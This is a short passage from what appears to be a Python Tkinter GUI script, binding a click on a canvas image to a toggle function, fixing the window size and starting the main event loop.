canvas.tag_bind(image_22_toggle, "<Button-1>", toggle_image_21_22)

toggle_state_21_22 = False

window.resizable(False, False)
window.mainloop()